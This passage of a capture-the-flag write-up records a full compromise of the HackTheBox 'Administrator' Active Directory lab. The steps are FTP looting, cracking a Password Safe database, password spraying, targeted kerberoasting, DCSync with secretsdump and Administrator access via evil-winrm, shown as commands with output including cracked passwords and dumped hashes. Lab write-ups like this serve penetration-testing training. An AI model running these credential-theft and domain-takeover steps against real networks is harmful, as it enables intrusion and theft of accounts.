SMB         10.129.7.55     445    DC               Share           Permissions     Remark
SMB         10.129.7.55     445    DC               -----           -----------     ------
SMB         10.129.7.55     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.55     445    DC               C$                              Default share
SMB         10.129.7.55     445    DC               IPC$            READ            Remote IPC
SMB         10.129.7.55     445    DC               NETLOGON        READ            Logon server share
SMB         10.129.7.55     445    DC               SYSVOL          READ            Logon server share
```

### 21 - FTP : Discovered password safe v3 database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc ftp $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --ls
FTP         10.129.7.55     21     administrator.htb [+] benjamin:newP@ssword2024
FTP         10.129.7.55     21     administrator.htb [*] Directory Listing
FTP         10.129.7.55     21     administrator.htb 10-05-24  08:13AM                  952 Backup.psafe3
```

Dump FTP

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ mkdir -p loot/ftp && lftp $(pt get rhost) -u "$(pt get user),$(pt get pass)" -e 'set ftp:list-options -a; mirror . ./loot/ftp --parallel=40 --only-newer'
New: 1 file, 0 symlinks
952 bytes transferred in 1 second (861 B/s)
lftp benjamin@administrator.htb:/>
```

### Crack Password safe v3 database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ file loot/ftp/Backup.psafe3
loot/ftp/Backup.psafe3: Password Safe V3 database
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ hashcat loot/ftp/Backup.psafe3 /opt/wordlists/rockyou.txt -m 5200
hashcat (v6.2.6) starting
[...]
loot/ftp/Backup.psafe3:tekieromucho

Session..........: hashcat
Status...........: Cracked
[...]
```

### Loot Password safe v3 database

- Google : `password safe v3`

> Download - https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true

```bash
cd /opt/Production
wget https://github.com/pwsafe/pwsafe/releases/download/1.20.0/passwordsafe-debian12-1.20-amd64.deb
sudo apt install ./passwordsafe-debian12-1.20-amd64.deb -y
```

![](/assets/obsidian/96a2b9714879dca70c1d0d9cc6228cb3.png)

![](/assets/obsidian/764d4337ad1ea663762c05c1c729bfe8.png)

Export the credentials

![](/assets/obsidian/0d07bc6f95b5ab0ac6521c55f6d47585.png)

![](/assets/obsidian/b7f17e5a0b30ea10e5273ab195e45faa.png)

Extract to `username:password` format from result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ cat ./loot/Backup.txt | awk '{print $3":"$4}' | tail -n +2 | tee ./loot/Backup.txt.creds
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

### Password spray

Split out user and password lists

```bash
cat ./loot/Backup.txt.creds | cut -d ":" -f 2- | sed '/^[[:space:]]*$/d' | sort -u > ./loot/Backup.txt.creds.pass; cat creds.lst | cut -d ":" -f 1 | sed '/^[[:space:]]*$/d' | sort -u > ./loot/Backup.txt.creds.user
```

Spray passwords on enabled users

```bash
/opt/sectools/password-attacks/BruteForce/brutespray -q -f ./nmap/all_tcp_ports.gnmap -u ldeep/_users_enabled.lst -p loot/Backup.txt.creds.pass
```

![](/assets/obsidian/83f96304596b60e571f786b53736f9b7.png)

Mark `emily` as owned

![](/assets/obsidian/7d9b1c6060c81010565f7e942df294ee.png)

### 5985 - Evil-winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ pt set user 'emily'; pt set pass 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ evil-winrm -i $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"

Evil-WinRM shell v3.6

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cat ..\Desktop\user.txt
c58229d90f548b4da14e633534f19aa4
```

# Root Flag
---

## From emily to ethan


### Targeted kerberoast on ethan

Get `emily`'s outbound object control

![](/assets/obsidian/a5617ddb5bb3ea858bf1b896b366861b.png)

![](/assets/obsidian/648bf285dc592f744ea6a14b0238932a.png)

![](/assets/obsidian/69c86a0fe1be7f68f0fda5124f515792.png)

![](/assets/obsidian/5e542f63a9e5f7bfea520e9b68fab017.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -v -d "$(pt get domain)" -u "$(pt get user)" -p "$(pt get pass)" -o targetedkerberoast.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Writing hash to file for (ethan)
[VERBOSE] SPN removed successfully for (ethan)

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ cat targetedkerberoast.txt
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$863560d539514127c489b14754ecc3fa$b53ef40c0cf84b70dda52e631c89112e7937264bf741ade9b4fa39f3b24c40d37d3f943c7509442a4818ec439bd4a26539b8f1e76285227645c3d842dda488d424ba960acf84935a231e04282cedc3009c1bf0f60fe9494bac98a9af9cf954e9840c45d8ad64ac788a1cb4cc7e41b3e59b930937f509b5f1f53e80eebfa9c6e72565e89def0c05cfeaebd4bc5340e4d895e56337adf06116f04c34e8f05bf64835e8faf3209966f4933540531f1ff9a3030f29b8c8bb7f561630ea1ff2743354afde3981bd1c6b7a5246b4e2f3955439ad6c3273c3b2d9a45cc329d19c59983291f69985f30b80518e3d422fc916daa758be38509f8360ca7637f6945d9123c327ff8924d80e20911028e14cadfcb03ba6a93f084bc3de815c32b45e0eadbf5bd52c2c4caab4dce0b7a4d44a6d560516d19fbc448f80e91b66f4fe8d7ae47a938bb0e34f2ee3bc62ebc31f79ea2ddbfc41baf100c0cb9d35aef3fbb10985824f84ed44be9206ed4dd69bc7db49dcf3d537f5685bf4243a3dc3888ad2889b7a9fd78bdf0f862a2942f7e776213da55ff2aae5ab080e84fc5f9e61b59b5ca105a9f15fc96b488096f47728f924c1621de9826f6a8ee6a02c068b1aff677c837337642f1578bfeb9437d69cd37bf8fd45d31aa948642902f23ee868ed1f1fdabb7e423ac35383106bbfe79c0078302284cfa1586bee09711463d2e677856a9b7fed6fe7d5d49480914ad98bb7570e5177da1f44f09ada2d27765b530d217726a452a5d95f2f506b8cde1244d2601077ffffb55c1410f16a71767f102c913afd9293b7ee3fcf6f9f26f1f16c6f9fb20633fa8f2de4fcfef9226fe089cbebe671bfba945ded3f5f85fc73b845d60e2b8613dcf1fd8ba672431c6193697c7fc893cc9c65cb19b7bd4862e9312ace70c781438122144cb4f51d2d114f5d88be60d2e37bbe09d3fad826a32d8e5a9dcb1d34a80ad7c03d88a57b2ea09c2cd5ab5c4cb3863e9fb37b54f4116299233b1ee3ffbf09102a3e6e63a4b92d989f42fcc2e3b62dc35b219ed1c974771c1ceed235326ffcaec2765f31698af2c6425e5555d26758b85eb1cdabb527d8d198d8f9d17980c2dba084df5a3c4bccfe81b91aefded63188241fc624fceb95b16bcdc758dff2b020de796be280d51a00a61279c6ad16dce5cbff719ed89ec12b92f7463be03fa485293cd89deec5610dca23756d7cb56ec6fbf2bf56107c48a0272df4dc23086d8ee40c027f91ef73cdd3d492a95fa0cb6403051fd330a709fa347d06b14862521fb1ed51ffbcd0998a1ffaa271360c945a68ebe830bee6049e316f2c1da8f1b59a2d80bd8e8b8231d330869ce09fdd23c12c3347f8b752dc867fe9e1cc012a19f180732756ccce84bac13e5ad932c85732cf0fe4b0f41e1942503353edb131f25bf4555362daeae478c0bc25167c66b152ce5dd8b529d11a4bd83911ac85ba96254bdb83a0fa9f2d8884a83b947e209da980931e313b6fb62a5dda2ff390002f9d8c895ee50957a2a4a886c65ae83b
```

```bash
hashcat targetedkerberoast.txt /opt/wordlists/rockyou.txt -m 13100
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ hashcat targetedkerberoast.txt /opt/wordlists/rockyou.txt -m 13100 --show
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$863560d539514127c489b14754ecc3fa$b53ef40c0cf84b70dda52e631c89112e7937264bf741ade9b4fa39f3b24c40d37d3f943c7509442a4818ec439bd4a26539b8f1e76285227645c3d842dda488d424ba960acf84935a231e04282cedc3009c1bf0f60fe9494bac98a9af9cf954e9840c45d8ad64ac788a1cb4cc7e41b3e59b930937f509b5f1f53e80eebfa9c6e72565e89def0c05cfeaebd4bc5340e4d895e56337adf06116f04c34e8f05bf64835e8faf3209966f4933540531f1ff9a3030f29b8c8bb7f561630ea1ff2743354afde3981bd1c6b7a5246b4e2f3955439ad6c3273c3b2d9a45cc329d19c59983291f69985f30b80518e3d422fc916daa758be38509f8360ca7637f6945d9123c327ff8924d80e20911028e14cadfcb03ba6a93f084bc3de815c32b45e0eadbf5bd52c2c4caab4dce0b7a4d44a6d560516d19fbc448f80e91b66f4fe8d7ae47a938bb0e34f2ee3bc62ebc31f79ea2ddbfc41baf100c0cb9d35aef3fbb10985824f84ed44be9206ed4dd69bc7db49dcf3d537f5685bf4243a3dc3888ad2889b7a9fd78bdf0f862a2942f7e776213da55ff2aae5ab080e84fc5f9e61b59b5ca105a9f15fc96b488096f47728f924c1621de9826f6a8ee6a02c068b1aff677c837337642f1578bfeb9437d69cd37bf8fd45d31aa948642902f23ee868ed1f1fdabb7e423ac35383106bbfe79c0078302284cfa1586bee09711463d2e677856a9b7fed6fe7d5d49480914ad98bb7570e5177da1f44f09ada2d27765b530d217726a452a5d95f2f506b8cde1244d2601077ffffb55c1410f16a71767f102c913afd9293b7ee3fcf6f9f26f1f16c6f9fb20633fa8f2de4fcfef9226fe089cbebe671bfba945ded3f5f85fc73b845d60e2b8613dcf1fd8ba672431c6193697c7fc893cc9c65cb19b7bd4862e9312ace70c781438122144cb4f51d2d114f5d88be60d2e37bbe09d3fad826a32d8e5a9dcb1d34a80ad7c03d88a57b2ea09c2cd5ab5c4cb3863e9fb37b54f4116299233b1ee3ffbf09102a3e6e63a4b92d989f42fcc2e3b62dc35b219ed1c974771c1ceed235326ffcaec2765f31698af2c6425e5555d26758b85eb1cdabb527d8d198d8f9d17980c2dba084df5a3c4bccfe81b91aefded63188241fc624fceb95b16bcdc758dff2b020de796be280d51a00a61279c6ad16dce5cbff719ed89ec12b92f7463be03fa485293cd89deec5610dca23756d7cb56ec6fbf2bf56107c48a0272df4dc23086d8ee40c027f91ef73cdd3d492a95fa0cb6403051fd330a709fa347d06b14862521fb1ed51ffbcd0998a1ffaa271360c945a68ebe830bee6049e316f2c1da8f1b59a2d80bd8e8b8231d330869ce09fdd23c12c3347f8b752dc867fe9e1cc012a19f180732756ccce84bac13e5ad932c85732cf0fe4b0f41e1942503353edb131f25bf4555362daeae478c0bc25167c66b152ce5dd8b529d11a4bd83911ac85ba96254bdb83a0fa9f2d8884a83b947e209da980931e313b6fb62a5dda2ff390002f9d8c895ee50957a2a4a886c65ae83b:limpbizkit
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ pt set user 'ethan'; pt set pass 'limpbizkit'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
ethan:limpbizkit

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
SMB         10.129.7.55     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.55     445    DC               [+] administrator.htb\ethan:limpbizkit
```

## From ethan to domain administrator

### DCSync

Use **kerberos** for opsec safe

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ getTGT.py -dc-ip $(pt get ip) $(pt get domain)/$(pt get user):$(pt get pass)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ethan.ccache

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ pt set ticket $(realpath "$(pt get user).ccache")

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:3a121836acbd7e7ede51a705533522d4:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:3a121836acbd7e7ede51a705533522d4:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:f9a45cd7fe656f9bb989740cb2a2d8396e9d1bcfbbc47bbd505b3f8dfe7b3217
administrator.htb\michael:aes128-cts-hmac-sha1-96:c2f5119f595c40cc9c4c808801ecf075
administrator.htb\michael:des-cbc-md5:7658fdd0c75bc43b
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:cd82d145c56d03952dc93291bcbc11f81048e209c8abce32184e02aa3b75c58a
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:feeeecfc06fa542de56ea406c15abece
administrator.htb\benjamin:des-cbc-md5:07b0f23bdce9fd43
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

### 5986 - Evil-Winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ getTGT.py -dc-ip $(pt get ip) -aesKey "$(cat secretsdump.ntds.kerberos | grep Administrator | grep 'aes256' | awk -F: '{print $NF}')" "$(pt get domain)/Administrator"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.6

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
93306a00cae82788fc924f0320e44792
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

# Additional
---
